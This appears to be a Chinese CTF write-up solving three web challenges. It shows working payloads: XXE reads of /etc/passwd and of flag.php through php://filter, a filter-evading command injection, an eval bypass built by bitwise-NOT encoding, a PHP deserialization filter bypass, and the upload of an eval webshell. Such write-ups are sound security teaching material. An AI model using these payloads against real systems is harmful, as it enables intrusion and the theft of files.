**2.XX?**  
![](../Images/6eb9982f1a4868d9b1059612f8386154.png)

  

  

  

直接访问根目录，发现是个百度页面，看了下源码，没什么异常。  

  

![](../Images/e48c384cef60b48c3c04358f8fa5e001.png)

  

访问下 index.php ，发现有点东西，尝试访问几个常见备份文件后缀，没有特别的发现。仔细看了下，发现标题是 gedit ，猜想是 gedit 的备份文件, 通过 index.php~ 获取备份源码。  
![](../Images/14fa2364df0e914e30e51154d0ef6b64.png)![](../Images/e36fa04f4d55238d840f37dcbc273811.png)

  

![](../Images/c7f35f02f121642224791b6e82e0c4ad.png)源码中通过 php://input 获取 POST 请求中的内容，然后把内容作为 xml 解释， 猜想应该是XXE 漏洞利用。根据参数名构造以下 XML 数据发送到服务器。

  

*   
*   

```
`<?xml version="1.0"?>``<creds><user>admin</user><pass>pass</pass></creds>`
```

  

发现可以回显用户名。  

  

![](../Images/1385bba995372548054a8a4137b6f139.png)  

  

使用以下 XXE payload 可读取 /etc/passwd 文件  

*   
*   
*   

```
`<?xml version="1.0"?>``<!DOCTYPE ANY [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>``<creds><user>&xxe;</user></creds>`
```

![](../Images/21076a14b9fdbcd64f0b4666f47d4b3d.png)

  

尝试读取/flag, /etc/flag, 都不存在。然后尝试读取 index.php , 但不知道网站根目录路径  

  

![](../Images/46fb148ad854d565f050e10c308a17b5.png)

  

接着也发现根目录有 flag.php 文件

  

![](../Images/e28597fbc439b60dc171f0ba47c1ed58.png)查了一下，发现可以通过 php://filter/ 来读取当前目录下的文件。于是构造以下 XXE payload 即可读取 flag.php

*   
*   
*   

```
`<?xml version="1.0"?>``<!DOCTYPE ANY [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'>]>``<creds><user>&xxe;</user></creds>`
```

![](../Images/57a60a35cdd107e2c558eb8818b30320.png)

![](../Images/e6ab94b0e90d9658b02bce9b6ec980f8.png)

  

使用 c""at${IFS}/fl""ag 读取 flag 文件，提示 flag 不在第一行  

  

![](../Images/035cad0866c5a86a86547d3318e68df7.png)

  

可以使用tail /flag -n +3 的方式来读取第3行的内容  

  

![](../Images/f9903ecafec2cd924d43f97d6157ddc7.png)

  

最后通过 burp 爆破，发现 flag 在第16行。

**4. php**  

  

![](../Images/d9e30370d3f0d5c10b2164879e1b05c5.png)

  

访问首页，是 Apache 默认界面。

  

![](../Images/3d12f124b601d0aeccb2c96d3695a73c.png)

  

访问 index.php ，给出了源码， 源码中获取 code 参数的内容， 然后把 code 参数的内容传进 eval 中执行。理论上只要把 code 的值设置成 GetYourFlag() 即可获取 flag, 但在执行之前做了过滤，如果内容是字母，数字，下划线等特殊字符，则拒绝执行。  

  

![](../Images/db8c8b181b6dc747db97057e54f516ef.png)

  

查了下，发现 p 神的文章里面说到可以通过 ('phpinfo')(); 的方式来执行字符串的代码。然后通过特殊字符取反来构造字母，如 ~ 0xb8 的值刚好是字母 G 。通过下面的方式生成 GetYourFlag 取反的十六进制值。

  

![](../Images/70aec3bcdafbe0dc11f59387cb6547ba.png)![](../Images/a015c37cc9537d353b910aa691bcd234.png)

  

然后在输出的十六进制字符串的每两个字符前加上 % 来构造 URL 编码的特殊字符串，最后的 payload 如下：  
http://119.61.19.212:8082/index.php?code=(~%b8%9a%8b%a6%90%8a%8d%b9%93%9e%98)()  
![](../Images/184e7f3a0569b5e03b1947891cd0f800.png)

**6\. api**  

  

api 这题只给了个地址，直接访问，未发现什么，然后访问 /api/ 提示 POST filename 参数。  
  
![](../Images/e4cfcc01350679a089265722e69564a4.png)

  

直接 POST filename 参数提示 json 解析错误  
![](../Images/83669863acbafc72408f749411d92272.png)  
经尝试，可以通过以下方式传递参数：  
  
![](../Images/fe9d01039df2c652f8b391f78c3715cc.png)  
尝试读取上级目录的 index.php  
![](../Images/85a703530398823f66c8618239e3405f.png)  
根目录的 index.php 包含了 hack.php ，然后接收 flag 参数的值来进行反序列化 。这里存在反序列化漏洞。  
继续读取 hack.php  
  
![](../Images/9f1892c3d06adb597bb63ddbe6b8b534.png)  
hack.php 中的 readfile() 函数会读取 $file 变量中指定的文件。同时在注释中提示了读取 fffffaa\_not.php 文件，所以只需要构造以下反序列化对象作为 flag 的值即可读取 fffffaa\_not.php 的内容：

  

O:4:"hack":1:{s:4:"file";s:15:"fffffaa\_not.php";}

  

但在 index.php 中有对反序列化内容过滤  
![](../Images/49fca74b6ffdc28bd0279814efda1d51.png)  

  

查了下，可以在O: 后面添加一个加号来绕过，payload如下：  
O:+4:"hack":1:{s:4:"file";s:15:"fffffaa\_not.php";}http://119.61.19.212:8086/?flag=O%3a%2b4%3a"hack"%3a1%3a{s%3a4%3a"file"%3bs%3a15%3a"fffffaa\_not.php"%3b}  
![](../Images/a77149c3dc523640ec5526f39d0bf14a.png)

  

查看 fffffaa\_not.php 的代码，发现获取参数 jhh08881111jn 的值作为内容，file\_na 的值作为文件名来上传文件到 uploads 目录中。其中做了文件内容检查，不能有 \[< 这些符号， 可以通过把参数设置成数组来绕过 jhh08881111jn\[\]， payload 如下  
http://119.61.19.212:8086/fffffaa\_not.php?jhh08881111jn\[\]=<%3fphp+@eval($\_POST\[cmd\])%3b%3f>&file\_na=1234  
![](../Images/3bcc8eaf88f8a2e862b90f23cdb9d862.png)

  

访问uploads/1234.php，想执行命令，发现 500 错误，然后执行 phpinfo()， 发现禁用了危险函数：  
![](../Images/1f0a3d8c115ef395539999066dea0c4a.png)  
这里可以直接使用 scandir() 函数来列目录，然后通过 file\_get\_contents() 函数来读取文件。  
  
![](../Images/2e3e7a5927b2f76eb7a8847f84051103.png)
